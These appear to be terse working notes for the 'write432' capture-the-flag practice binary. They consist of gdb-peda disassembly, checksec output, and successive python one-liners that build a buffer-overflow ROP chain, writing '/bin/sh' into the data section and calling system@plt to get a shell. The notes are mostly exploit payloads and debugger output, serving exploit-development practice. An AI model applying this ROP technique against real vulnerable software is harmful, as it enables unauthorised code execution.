ROPgadget --binary write432 > ropgadget

gdb-peda$ disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804864c <+0>:	push   ebp
   0x0804864d <+1>:	mov    ebp,esp
   0x0804864f <+3>:	sub    esp,0x8
   0x08048652 <+6>:	sub    esp,0xc
   0x08048655 <+9>:	push   0x8048754
   0x0804865a <+14>:	call   0x8048430 <system@plt>
   0x0804865f <+19>:	add    esp,0x10
   0x08048662 <+22>:	nop
   0x08048663 <+23>:	leave
   0x08048664 <+24>:	ret
End of assembler dump.
gdb-peda$ disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048670 <+0>:	mov    DWORD PTR [edi],ebp
   0x08048672 <+2>:	ret
   0x08048673 <+3>:	xchg   ax,ax
   0x08048675 <+5>:	xchg   ax,ax
   0x08048677 <+7>:	xchg   ax,ax
   0x08048679 <+9>:	xchg   ax,ax
   0x0804867b <+11>:	xchg   ax,ax
   0x0804867d <+13>:	xchg   ax,ax
   0x0804867f <+15>:	nop
End of assembler dump.

gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f519ab ("/bin/sh")
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial





# /bin/ls
# "\x4c\x86\x04\x08" is the address of usefulFunction
python -c 'print "A" 44 + "\x4c\x86\x04\x08"' > input.txt



arg[0]: 0x8048754 ("/bin/ls")
arg[1]: 0x41414141 ('AAAA')

# bss addr is "\x40\xa0\x04\x08"

0x080486da : pop edi ; pop ebp ; ret

python -c 'print "A" * 44 + "\xda\x86\x04\x08" + "\x40\xa0\x04\x08" + "/bin/sh\0" + "\x70\x86\x04\x08" + "\x4c\x86\x04\x08"' > input.txt

python -c 'print "A" * 44 + "\xda\x86\x04\x08" + "\x40\xa0\x04\x08" + "\xab\x19\xf5\xf7" + "\x70\x86\x04\x08" + "\x4c\x86\x04\x08"' > input.txt


# system (0x804865a)
python -c 'print "A" * 44 + "\xda\x86\x04\x08" + "\x40\xa0\x04\x08" + "\xab\x19\xf5\xf7" + "\x70\x86\x04\x08" + "\x5a\x86\x04\x08"' > input.txt


08048430 <system@plt>:
python -c 'print "A" * 44 + "\xda\x86\x04\x08" + "\x40\xa0\x04\x08" + "\xab\x19\xf5\xf7" + "\x70\x86\x04\x08" + "\x30\x84\x04\x08"' > input.txt




[25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4

We use the data section as buffer


python -c 'print "A" * 44 + "\xda\x86\x04\x08" + "\x28\xa0\x04\x08" + "/bin" + "\x70\x86\x04\x08" + "\xda\x86\x04\x08" + "\x2c\xa0\x04\x08" + "/sh\x00" + "\x70\x86\x04\x08" + "\x30\x84\x04\x08" + "AAAA" + "\x28\xa0\x04\x08"' > input.txt



   0xf7e30c8c:	push   eax
   0xf7e30c8d:	lea    eax,[esi-0x56655]
   0xf7e30c93:	push   eax
=> 0xf7e30c94:	call   0xf7ea67e0 <execve>
   0xf7e30c99:	mov    DWORD PTR [esp],0x7f
   0xf7e30ca0:	call   0xf7ea67c8 <_exit>
   0xf7e30ca5:	lea    esi,[esi+eiz*1+0x0]
   0xf7e30ca9:	lea    edi,[edi+eiz*1+0x0]
Guessed arguments:
arg[0]: 0xf7f519ab ("/bin/sh")
arg[1]: 0xffffbce8 --> 0xf7f519b0 --> 0x65006873 ('sh')
arg[2]: 0xffffbebc --> 0xffffc199 ("XDG_SEAT=seat0")



python -c 'print "A" * 44 + "\xda\x86\x04\x08" + "\x40\xa0\x04\x08" + "/bin" + "\x70\x86\x04\x08" + "\xda\x86\x04\x08" + "\x44\xa0\x04\x08" + "/sh\x00" + "\x70\x86\x04\x08" + "\x30\x84\x04\x08" + "AAAA" + "\x40\xa0\x04\x08"' > input.txt
